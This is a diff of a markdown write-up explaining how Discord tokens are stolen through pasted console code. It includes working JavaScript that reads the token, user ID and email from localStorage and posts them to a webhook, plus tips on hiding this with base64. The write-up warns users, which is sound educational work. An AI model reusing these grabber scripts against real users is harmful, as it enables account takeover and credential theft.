@@ -16,9 +16,6 @@ This script could be quickly adapted to act as a warning for uncautious users, t
 ```JS
 let token = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1,-1);
 alert(`Your Discord token is:\n${token}\n\nNever paste any code you don't understand in the console!`);
-
-// This could also be compacted into one line
-alert(`Your Discord token is:\n${document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1,-1)}\n\nNever paste any code you don't understand in the console!`);
 ```
 
 It could just as easily be modified into something malicious, as in this example:
@@ -38,13 +35,10 @@ fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstu
     "Content-Type": "application/json"
   },
   body: JSON.stringify({
-    "content": token,
-    "embeds": null
+    content: token,
+    embeds: null
   })
 });
-
-// Once again, this could be minified
-fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKLMNOPQRSTUVWXYZ1234567890abcde",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({"content":document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token.slice(1,-1),"embeds":null})});
 ```
 
 Even with a modification as simple as encoding all mentions of a "token" and the Webhook URL *(which could catch their eye)* to Base64 and decoding them using `atob()` could suffice to trick a naive user, as done in this snippet:
@@ -57,31 +51,37 @@ Any attempt at obfuscation could be susicious to some users, but the great major
 While accessing `localStorage`, an attacker might as well make use of other cached information *(although i just realized all one would really need is the token)* and create a nice embed for his webhook, as I did with the following script:
 ```JS
 let localStorage = document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage;
-fetch("https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKLMNOPQRSTUVWXYZ1234567890abcde", JSON.stringify({
-  "content": null,
-  "embeds": [{
-    "title": "Successfully Grabbed Token!",
-    "color": 2067276,
-    "fields": [{
-      "name": "User",
-      "value": `<@!${localStorage.user_id_cache}>`,
-      "inline": true
-    }, {
-      "name": "Email",
-      "value": localStorage.email_cache,
-      "inline": true
-    }, {
-      "name": "Token",
-      "value": l.token.slice(1, -1).replaceAll("-", "-/n")
+fetch("YOUR_WEBHOOK_URL", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    content: null,
+    embeds: [{
+      title: "Successfully Grabbed Token!",
+      color: 2067276,
+      fields: [{
+        name: "User",
+        value: `<@!${localStorage.user_id_cache.slice(1,-1)}>`,
+        inline: true
+      }, {
+        name: "Email",
+        value: localStorage.email_cache.slice(1,-1),
+        inline: true
+      }, {
+        name: "Token",
+        value: localStorage.token.slice(1, -1).replaceAll("-", "-\n")
+      }],
+      footer: {
+        text: "Hacker Pepe v0.0.0",
+        icon_url: "https://imgur.com/5Ri5eok.png"
+      }
     }],
-    "footer": {
-      "text": "Hacker Pepe v0.0.0",
-      "icon_url": "https://imgur.com/5Ri5eok.png"
-    }
-  }],
-  "username": "Hacker Pepe",
-  "avatar_url": "https://imgur.com/5Ri5eok.png"
-}));
+    username: "Hacker Pepe",
+    avatar_url: "https://imgur.com/5Ri5eok.png"
+  })
+});
 ```
 
 Regardless of whether or not an attacker sends himself another user's token using a great embed such as the one produced by the above script, allowing someone else access to `localStorage` can let them extract a lot of information about the user, and should never be done.
